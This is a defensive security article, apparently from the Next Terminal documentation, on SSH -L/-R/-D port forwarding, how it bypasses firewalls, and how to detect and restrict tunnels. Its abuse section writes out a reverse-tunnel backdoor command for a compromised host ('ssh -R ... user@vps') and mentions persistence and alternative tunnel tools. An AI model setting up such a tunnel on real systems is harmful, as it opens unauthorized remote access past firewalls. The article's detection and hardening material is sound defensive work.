---
layout: doc
title: "How ssh -L/-R/-D Punch Through the Firewall: SSH Port Forwarding, Abuse, and Audit"
description: "SSH port forwarding (ssh -L/-R/-D tunnels) can safely reach an intranet or quietly become a firewall bypass. This article explains local/remote/dynamic forwarding, how to detect and control tunnel abuse, and how to centralize port-forwarding audit with a bastion host."
head:
  - - meta
    - name: keywords
      content: ssh port forwarding, ssh tunnel, ssh -L, ssh -R, ssh -D, AllowTcpForwarding, ssh tunnel detection, port forwarding audit, bastion host, Next Terminal
  - - meta
    - property: og:title
      content: "How ssh -L/-R/-D Punch Through the Firewall: SSH Port Forwarding, Abuse, and Audit"
  - - meta
    - property: og:description
      content: How local, remote, and dynamic SSH tunnels work, why they bypass firewalls, and how to detect and control port-forwarding abuse.
---

# How ssh -L/-R/-D Punch Through the Firewall: SSH Port Forwarding, Abuse, and Audit

SSH port forwarding is arguably the most useful — and most dangerous — feature in an operator's toolbox. The `ssh -L`, `ssh -R`, and `ssh -D` flags can conjure an encrypted tunnel between two machines, bridging networks that were never meant to talk; the same mechanism is routinely used to open a backdoor through a "default-deny inbound, allow outbound" firewall. One of the most common findings during a security sweep is an SSH tunnel on some server with no registered owner.

This article takes the tunnel apart: what each of the three forwarding modes actually does, why it slips past the firewall, how to spot an abnormal tunnel from processes and connections, and how to control it — from `sshd_config` all the way to a centralized bastion-host entry point.

## Three forwarding modes: local, remote, and dynamic

Let's be precise about the mechanism first. SSH port forwarding reuses the existing encrypted, authenticated SSH connection to multiplex a new data stream over it. It does not need the target host to open any extra port, and it does not depend on route reachability in the target network — as long as an SSH connection can be established between the initiating side and the SSH server, the tunnel works. That is both its power and its danger.

At the protocol level, forwarding does not create a new listening service in the OS; it reuses SSH's channel mechanism. The client sends a `direct-tcpip` (for `-L`/`-D`) or `forwarded-tcpip` (for `-R`) channel-open request, the peer connects to the target address on its behalf, and the TCP stream is fed back through the already-encrypted channel. To the operating system this is just a socket owned by the SSH process — no new port is genuinely "opened" for the firewall to recognize, which is exactly why so many edge devices are blind to it.

The three modes differ in which side listens and which side the traffic egresses from:

| Flag | Name | Listens on | Egress | Typical use |
|------|------|------------|--------|-------------|
| `-L` | Local forward | Client | SSH server | Reach an intranet service only the jump host can see |
| `-R` | Remote forward | SSH server | Client | Expose an intranet service back to the outside |
| `-D` | Dynamic forward | Client | SSH server | Run a local SOCKS proxy and route all traffic through the server |

**Local forwarding `-L`** looks like this:

```bash
ssh -L 127.0.0.1:3306:10.0.0.5:3306 user@jump.example.com
```

It listens on local port `3306`, sends the connection through the SSH tunnel to `jump.example.com`, and has the jump host connect to the intranet `10.0.0.5:3306`. So a local `mysql -h 127.0.0.1 -P 3306` actually reaches the intranet database. The jump host becomes the egress point, and the intranet service never has to expose any port to the public.

**Remote forwarding `-R`** reverses the direction:

```bash
ssh -R 0.0.0.0:8080:127.0.0.1:8080 user@public.example.com
```

This listens on port `8080` on the SSH server (`public.example.com`) and sends incoming connections back through the tunnel to the client, which connects to its own `127.0.0.1:8080`. The crucial detail is the **connection direction**: SSH is initiated by the client connecting out to the server, but the data flow is "server receives a request → sends it back to the client". That means a machine inside the network, as long as it can make an outbound SSH connection, can "reverse"-mount its own service onto a port of a public server — and the firewall cannot stop it, because all it sees is one perfectly normal outbound SSH connection.

**Dynamic forwarding `-D`** starts a SOCKS proxy locally:

```bash
ssh -D 1080 user@public.example.com
```

Local port `1080` becomes a SOCKS5 proxy. A browser or any program hands its traffic to it, and everything is forwarded out through the SSH server. It is often used to borrow the server's network position to reach targets and hide the real source, and just as often abused as a data channel that sidesteps egress auditing (web filtering, outbound allowlists).

## Why -R is the standard "intranet backdoor"

Once you understand the connection direction, the danger of `-R` becomes obvious. A traditional firewall defaults to "deny inbound, allow outbound": traffic coming in from the outside is dropped, traffic originating inside flows out freely. `-R` does the opposite of what that rule expects — it **actively reaches out** from inside the network, then opens a listening port on the server to pipe traffic back in. To the firewall the whole link is just an ordinary outbound connection; the inbound half is wrapped inside the tunnel where the rule can't see it.

So an attacker or insider can do this: on a compromised internal host, run `ssh -R 0.0.0.0:2222:127.0.0.1:22 user@vps`, and from then on anyone who can reach `vps:2222` is delivered straight into port 22 of the internal host. As long as the tunnel lives, the outside-to-inside path lives — while the firewall log shows nothing but an innocuous SSH session.

`-L` and `-D` abuse is just as common: an employee with jump-host SSH access uses `-L` to pull an intranet admin console or a database port they shouldn't reach onto their laptop, or uses `-D` to turn the jump host into an anonymizing egress that dodges the company's traffic auditing. None of this requires cracking a password — it only requires one legitimate SSH grant, and the tunnel amplifies that grant many times over.

What makes it worse is how easily these tunnels are made persistent: wrapping `ssh -R` in `autossh` or `systemd` as a start-on-boot, reconnect-on-drop service means the tunnel rebuilds itself after a reboot without the attacker logging in again. A one-off sweep that isn't backed by continuous monitoring will keep missing a channel that silently reconnects.

## How to detect a tunnel in flight

The core of a sweep is: **look at listening ports, look at processes, look at authorized keys, look at connections.**

Start with listening ports that don't belong to any known service. A `-R` forward on the SSH server side is held by the `sshd` process, and it binds to the loopback address by default — so loopback listeners are exactly the ones you must not skip:

```bash
# Who is listening, and which process (note loopback listeners starting with 127.0.0.1)
ss -tnlp | grep -E 'sshd|127.0.0.1:|:2222|:8080'
# All sshd-related connections, including tunnels being established
ss -tnp | grep sshd
# Long-lived ssh processes carrying -R/-D/-L flags, sorted by elapsed time
ps -eo pid,user,etime,args | grep -E 'ssh .*(-R|-D|-L)'
```

If `sshd` is holding a port that is neither 22 nor a business port, you can be fairly sure a remote forward is running. Then pin down the process and user:

```bash
# Long-lived ssh processes with -R/-D/-L flags
ps aux | grep -E 'ssh .*(-R|-D|-L)'
# Which sockets a given process has open
lsof -i -P -n -p <PID>
# Which SSH login sessions are currently hanging around
who -u
```

There is an easy-to-miss asymmetry here: **the server side can only see `-R`**. A `-R` forward listens on the server, so `ss` reveals it immediately; but a `-L` forward listens on the client (an employee's laptop) and a `-D` SOCKS proxy also listens on the client, so on the server side there is just one more ordinary SSH session — nothing anomalous shows up in the listening ports. Server-side sweeps therefore only catch `-R`. To catch `-L`/`-D` abuse you need egress traffic monitoring: a sudden burst of sustained, long-lived outbound connections to unfamiliar destinations is often someone tunneling through.

Finally, audit the authorized keys. Many tunnels are established passwordlessly via keys in `authorized_keys`, and once a key is issued it stays valid for a long time, letting the tunnel rebuild silently. Pay particular attention to:

- Unknown public keys in `~/.ssh/authorized_keys`, and any suspicious `command=` or forwarding options;
- Keys that should carry `no-port-forwarding` or `restrict` but don't;
- Whether the authorized files for all users (especially `root` and service accounts) are complete and accounted for.

By default `sshd` does not write a log entry per forwarding, so log-based detection misses things easily. A more reliable setup is to raise `LogLevel` to `VERBOSE` in `sshd_config` and correlate it with connection-level monitoring (periodic `ss` snapshots, netflow) to answer "who opened what listener, when".

## Control: from sshd_config to authorized_keys

Controlling port forwarding rests on two layers — server-side configuration plus per-key options.

The key directives in `/etc/ssh/sshd_config`:

| Directive | Effect |
|-----------|--------|
| `AllowTcpForwarding` | `no` disables all; `local` allows only `-L`; `remote` allows only `-R`; `yes` allows both |
| `GatewayPorts` | Whether `-R` may bind a non-loopback address (`0.0.0.0`); default `no` binds only `127.0.0.1` |
| `PermitOpen` | Whitelist of `host:port` destinations `-L` may target |

For keys used by automation and scripts, per-key options in `authorized_keys` give the finest granularity:

```text
restrict,permitopen="10.0.0.5:3306" ssh-ed25519 AAAA... comment
```

`restrict` disables port forwarding, X11 forwarding, pty allocation and more by default; you then re-enable exactly what is needed via `permitopen`. An ops script that only needs to reach the database port should not also be granted tunnel-as-jump-host powers.

After configuring, run a negative test rather than trusting that the config "looks right": take an account that should not have forwarding permission, actually attempt `ssh -L` or `ssh -R`, and confirm it is rejected with a matching deny record in `sshd`'s `VERBOSE` log. Control only counts as landed when "it takes effect" and "it is auditable" are both true.

That said, these directives only constrain the SSH path. A machine with a shell can start a tunnel without SSH using `socat`, `chisel`, `frp` and similar tools, none of which `sshd_config` can see. So the real answer to outbound `-R`/`-D` tunnels is egress-side traffic control (an outbound allowlist that only permits necessary protocols); the SSH configuration is the first, and most commonly used, gate — not the last one.

## Three common misconceptions

**Mistake one: disabling password login is enough.** Turning off `PasswordAuthentication` and keeping only keys does not stop tunnels — anyone with a valid private key can still `-R`. Tunnel abuse happens *after* authentication, and has little to do with how the authentication was done.

**Mistake two: the default `GatewayPorts no` equals safety.** The default `no` only makes `-R` bind to `127.0.0.1` on the server, so the outside can't connect directly; but another local user or process on that same server — or another `-L` forwarding it out from the same host — can still reach it. It restricts "reachable remotely", not "reachable locally".

**Mistake three: port forwarding is bad, so ban it all.** Forwarding itself is neutral; legitimate scenarios (reaching an intranet database through a jump host, cross-region acceleration) depend on it every day. Banning it outright just pushes teams toward more covert, harder-to-audit workarounds. What you manage is "who, whether they may, where to, and is it logged" — not the feature itself.

## Bringing tunnels into a central entry point

Everything above is additive at the "machine + user" level: each machine gets its own `sshd_config`, each `authorized_keys` is reviewed individually. That works when there are only a few machines; once the fleet grows, it sprawls — you don't know who has access on which machines, whether anyone has set up a private tunnel, and there is no unified audit trail.

That is where a centralized entry point such as a bastion host earns its place: all SSH access converges on a single entry, the entry decides uniformly whether tunnels are allowed, and every session leaves a record. Take the open-source Next Terminal as an example: its SSH proxy server exposes a dedicated "enable tunnel" toggle — turned off, users can still log in normally but can no longer forward ports; combined with session recording and auditing (see [Compliance & Audit](/usage/compliance)), who opened which tunnel and when can be traced back to a person. For centralized control of SSH access and asset access, see [SSH Proxy Server](/usage/ssh-server), [Access Assets](/usage/access), and [Asset Management](/usage/asset); for a unified entry across networks, see [Agent Gateway](/usage/agent-gateway).

Which granularity to choose scales with the team: a handful of machines and one operator — `sshd_config` plus per-key options is enough; once the machine count and headcount grow and contractors or cross-team collaboration appear, it's worth converging the entry to a single place, so "is a tunnel open, and to where" stops being a manual sweep and becomes a queryable audit record.
